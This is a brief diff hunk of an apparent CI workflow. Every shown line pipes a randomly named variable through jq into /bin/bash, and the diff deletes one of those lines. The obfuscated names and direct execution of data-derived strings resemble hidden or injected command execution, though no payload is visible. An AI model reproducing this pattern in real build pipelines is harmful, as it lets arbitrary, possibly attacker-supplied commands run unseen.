@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$id07115" | jq -r .qyfz5290 | /bin/bash
           echo $s19469 | jq -r .g2 | /bin/bash
           echo $jsokx466 | jq -r .hgoza56326 | /bin/bash
-          echo $r33 | jq -r .aoczy47 | /bin/bash
           echo $qwkqy4476 | jq -r .i975 | /bin/bash
           printf '%s' "$edyl7" | jq -r .lxvs538 | /bin/bash
 
